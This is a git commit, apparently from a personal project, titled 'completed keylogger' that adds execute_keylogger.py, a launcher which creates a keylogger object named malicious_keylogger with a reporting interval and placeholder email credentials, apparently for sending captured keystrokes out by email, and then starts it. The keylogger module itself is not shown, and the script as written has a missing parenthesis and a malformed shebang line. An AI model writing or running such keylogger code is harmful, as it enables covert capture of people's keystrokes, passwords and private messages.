5be9a53e00fe76a15ffa10ee1e5dee8e3d6734db
tarunadityaselva <tarunadityaselva@gmail.com>
2020-08-13 11:42:26 +0530

    completed keylogger

---
+++ execute_keylogger.py
@@ -0,0 +1,11 @@
+#usr/bin/env python
+
+import keylogger
+
+# creating keylogger and providing information
+
+malicious_keylogger = keylogger.Keylogger(10, '**enter_email_here@email.com**', '**password**'
+
+#executig the keylogger
+
+malicious_keylogger.start()
